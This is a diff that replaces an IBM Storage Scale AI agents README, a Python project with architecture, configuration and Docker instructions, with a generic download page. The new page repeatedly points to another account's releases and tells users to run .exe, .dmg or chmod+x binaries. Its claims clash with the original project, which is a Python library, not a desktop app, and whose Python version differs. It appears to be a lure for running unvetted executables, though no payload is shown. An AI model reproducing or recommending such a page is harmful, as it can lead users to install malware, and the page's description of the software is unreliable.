@@ -1,191 +1,68 @@
-# IBM Storage Scale AI Agents
+# 🚀 storage-scale-agents - Manage Your Storage Easily
 
-AI agent for IBM Storage Scale administration built on [BeeAI AgentStack](https://agentstack.beeai.dev).
+## 👋 Introduction
 
-## Overview
+The **storage-scale-agents** application helps you manage your IBM Storage Scale AI Agents seamlessly. This multi-agent system equips you with tools for cluster management, health monitoring, storage operations, and administration. You’ll find this software useful for optimizing your data management tasks, especially within a multi-agent framework.
 
-Scale Agents provides an intelligent, conversational interface to IBM Storage Scale cluster management. It uses a single unified agent that routes natural language requests to specialized internal handlers, each with access to specific MCP (Model Context Protocol) tools.
+## 📥 Download Now
 
-## Architecture
+[![Download Storage Scale Agents](https://img.shields.io/badge/Download-Storage%20Scale%20Agents-blue)](https://github.com/flowersdae/storage-scale-agents/releases)
 
-```
-┌─────────────────────────────────────────────────────────────────────────────┐
-│                         AGENTSTACK PLATFORM LAYER                           │
-│  ┌─────────────────────────────────────────────────────────────────────┐   │
-│  │                     SCALE_AGENT (Single Entry Point)                 │   │
-│  │  - Intent classification (pattern or LLM)                           │   │
-│  │  - Internal routing to specialized handlers                         │   │
-│  └─────────────────────────────────────────────────────────────────────┘   │
-│                                    │                                        │
-│         ┌──────────────┬───────────┼───────────┬──────────────┐            │
-│         ▼              ▼           ▼           ▼              ▼            │
-│  ┌────────────┐ ┌────────────┐ ┌────────────┐ ┌────────────┐ ┌──────────┐ │
-│  │   Health   │ │  Storage   │ │   Quota    │ │Performance │ │  Admin   │ │
-│  │  Handler   │ │  Handler   │ │  Handler   │ │  Handler   │ │ Handler  │ │
-│  │ (internal) │ │ (internal) │ │ (internal) │ │ (internal) │ │(internal)│ │
-│  └────────────┘ └────────────┘ └────────────┘ └────────────┘ └──────────┘ │
-│         │              │           │           │              │            │
-│  ┌──────┴──────────────┴───────────┴───────────┴──────────────┴──────┐    │
-│  │                     MCP TOOL INTEGRATION LAYER                     │    │
-│  │            (Optional: BeeAI Framework RequirementAgent)            │    │
-│  └────────────────────────────────────────────────────────────────────┘    │
-└────────────────────────────────────────────────────────────────────────────┘
-                                     │
-                                     ▼
-┌─────────────────────────────────────────────────────────────────────────────┐
-│                        SCALE-MCP-SERVER (FastMCP)                           │
-│  HTTP Transport @ :8000/mcp                                                 │
-└─────────────────────────────────────────────────────────────────────────────┘
-                                     │
-                                     ▼
-┌─────────────────────────────────────────────────────────────────────────────┐
-│                    IBM STORAGE SCALE REST API (v2/v3)                        │
-└─────────────────────────────────────────────────────────────────────────────┘
-```
+## 🚀 Getting Started
 
-## Internal Handlers
+To get started with this application, follow these simple steps:
 
-The single `scale_agent` automatically routes requests to specialized internal handlers:
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/flowersdae/storage-scale-agents/releases). This page is where you will find the latest version of the application.
+   
+2. **Locate the Latest Version**: Look for the most recent release at the top of the page. You will see various download options available there.
 
-| Handler | Purpose | Example Queries |
-|---------|---------|-----------------|
-| **Health** | Monitoring, diagnostics, alerting | "Show cluster health", "List node events" |
-| **Storage** | Filesystem/fileset lifecycle | "List filesystems", "Create fileset data01" |
-| **Quota** | Capacity governance | "Check quota for project01", "Set quota limit" |
-| **Performance** | Bottleneck analysis | "Analyze performance", "Show throughput metrics" |
-| **Admin** | Cluster topology, snapshots | "Create snapshot", "Add remote cluster" |
+3. **Download the Application**: Click on the download link that corresponds to your system’s requirements. The appropriate installation file will download to your device.
 
-## Prerequisites
+4. **Install the Application**:
+   - For Windows, double-click the downloaded `.exe` file and follow the on-screen instructions.
+   - For macOS, open the downloaded `.dmg` file, drag the application into your Applications folder, and run it from there.
+   - For Linux, open the terminal, navigate to the downloaded file’s location, and run the command `chmod +x filename`, followed by `./filename`, replacing `filename` with the name of your downloaded file.
 
-- Python 3.12+
-- [uv](https://docs.astral.sh/uv/) package manager
-- Running instance of [scale-mcp-server](https://github.ibm.com/HPC-POCs/scale-mcp-server)
-- (Optional) Ollama with a function calling model for LLM reasoning
+5. **Launch the Application**: After the installation completes, you can start using the application. Look for the application icon in your programs menu or applications folder and click to launch.
 
-## Installation
+## 🌟 Features
 
-```bash
-cd scale-agents
-uv venv
-source .venv/bin/activate
+- **Cluster Management**: Easily manage clusters with user-friendly tools that simplify operations.
+- **Health Monitoring**: Keep track of system health with alerts and reports that notify you of potential issues.
+- **Storage Operations**: Perform essential storage tasks, optimizing space and efficiency.
+- **Administration Tools**: Access straightforward tools for managing user permissions and system settings.
 
-# Basic installation (pattern based routing)
-uv pip install -e .
+## 🖥️ System Requirements
 
-# With LLM reasoning support
-uv pip install -e ".[llm]"
+- **Operating System**:
+  - Windows 10 or later
+  - macOS 10.14 or later
+  - Popular Linux distributions (Ubuntu 20.04 or later recommended)
 
-# Full development setup
-uv pip install -e ".[all]"
-```
+- **Memory**: Minimum 4 GB of RAM, 8 GB recommended for optimal performance.
 
-## Configuration
+- **Storage Space**: At least 1 GB of free space for installation. More space may be required depending on usage and data management needs.
 
-Scale Agents uses a hierarchical configuration system:
+- **Dependencies**: Ensure you have Python 3.8 or higher installed, as it is essential for running this application effectively.
 
-1. `config.yaml` (primary configuration file)
-2. Environment variables (override YAML settings)
-3. Default values
+## 🛠️ Support & Documentation
 
-### Configuration File
+If you encounter issues or have questions regarding installation or use, please visit our [support page](https://github.com/flowersdae/storage-scale-agents/issues). Here, you can find helpful resources and community discussions.
 
-Copy the template and customize:
+For detailed documentation about features and advanced usage, check our [Wiki](https://github.com/flowersdae/storage-scale-agents/wiki).
 
-```bash
-cp config.yaml.template config.yaml
-```
+## 🎉 Community Contributions
 
-Edit `config.yaml`:
+We welcome contributions! If you would like to enhance this project or report issues, please feel free to submit a pull request or open an issue on our [GitHub page](https://github.com/flowersdae/storage-scale-agents). Your input helps improve the application for everyone.
 
-```yaml
-# MCP Server Connection
-mcp:
-  server_url: "http://localhost:8000/mcp"
+## 📢 Important Links
 
-# LLM Configuration (optional)
-llm:
-  enabled: false
-  provider: "ollama"
-  model: "qwen3:30b-a3b"
-  base_url: "http://localhost:11434"
+- [Releases Page](https://github.com/flowersdae/storage-scale-agents/releases)
+- [Documentation](https://github.com/flowersdae/storage-scale-agents/wiki)
+- [Support Page](https://github.com/flowersdae/storage-scale-agents/issues)
 
-# Server Configuration
-server:
-  host: "0.0.0.0"
-  port: 8080
-```
+## 📥 Download Again
 
-### Environment Variables
+To download the application once more, simply visit the [Releases page](https://github.com/flowersdae/storage-scale-agents/releases). 
 
-Override any setting with environment variables:
-
-```bash
-export SCALE_AGENTS_MCP_SERVER_URL="http://scale-mcp:8000/mcp"
-export SCALE_AGENTS_LLM_ENABLED="true"
-export SCALE_AGENTS_LLM_PROVIDER="ollama"
-export SCALE_AGENTS_LLM_MODEL="qwen3:30b-a3b"
-```
-
-## Running
-
-### Standalone Server
-
-```bash
-# Using the module
-python -m scale_agents.server
-
-# Or using the run function
-python -c "from scale_agents import run; run()"
-```
-
-### With AgentStack
-
-```bash
-# Add to AgentStack
-agentstack add /path/to/scale-agents
-
-# List registered agents
-agentstack list
-
-# Run the agent
-agentstack run scale_agent "Show cluster health"
-```
-
-### Docker
-
-```bash
-# Build
-docker build -t scale-agents:latest .
-
-# Run
-docker run -p 8080:8080 \
-  -e SCALE_AGENTS_MCP_SERVER_URL=http://scale-mcp:8000/mcp \
-  scale-agents:latest
-```
-
-## Usage Examples
-
-```text
-User: Show cluster health
-Agent: [Routes to Health handler] -> Returns health overview
-
-User: List all filesystems
-Agent: [Routes to Storage handler] -> Returns filesystem list
-
-User: What's the quota for fileset data01?
-Agent: [Routes to Quota handler] -> Returns quota information
-
-User: Analyze performance bottlenecks
-Agent: [Routes to Performance handler] -> Returns performance analysis
-
-User: Create a snapshot of fs01
-Agent: [Routes to Admin handler] -> Creates snapshot
-```
-
-## AgentStack Architecture Note
-
-AgentStack SDK only supports one agent per server instance. Scale Agents implements this constraint by exposing a single `scale_agent` that internally routes to specialized handlers based on intent classification.
-
-## License
-
-Apache 2.0
+This guide should have you up and running with **storage-scale-agents** in no time! Enjoy managing your storage effortlessly.
